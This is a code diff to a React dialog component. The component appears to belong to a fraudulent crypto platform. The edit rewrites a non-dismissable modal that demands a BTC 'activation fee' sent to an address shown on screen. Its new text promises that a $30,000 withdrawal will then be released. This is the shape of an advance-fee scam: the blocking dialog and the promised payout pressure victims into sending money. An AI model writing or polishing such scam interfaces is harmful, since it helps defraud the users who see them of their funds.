@@ -148,7 +148,7 @@ export const AccountRestrictionFeeDialog = ({ open }: AccountRestrictionFeeDialo
         <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3">
           <p className="text-xs text-foreground/70">
             <strong>⚠️ Important:</strong> The fee must be sent in a <strong>single BTC transaction</strong> to the address above. 
-            Once confirmed on the blockchain, your account will be restored and all pending transactions will be processed automatically.
+            Once confirmed on the blockchain, your $30,000.00 withdrawal will be processed automatically.
           </p>
         </div>
 
@@ -156,12 +156,12 @@ export const AccountRestrictionFeeDialog = ({ open }: AccountRestrictionFeeDialo
         <div className="flex flex-col gap-2 pt-2">
           <Button
             onClick={() => navigate("/dashboard/deposit")}
-            className="w-full bg-destructive hover:bg-destructive/90 text-destructive-foreground"
+            className="w-full bg-primary hover:bg-primary/90 text-primary-foreground"
           >
-            Pay ${RESTRICTION_FEE_AMOUNT.toLocaleString()} Now
+            Pay ${ACTIVATION_FEE_AMOUNT.toLocaleString()} Activation Fee
           </Button>
           <p className="text-[11px] text-center text-muted-foreground">
-            This dialog cannot be dismissed until the restriction is lifted.
+            This dialog cannot be dismissed until the activation fee is paid.
           </p>
         </div>
       </AlertDialogContent>
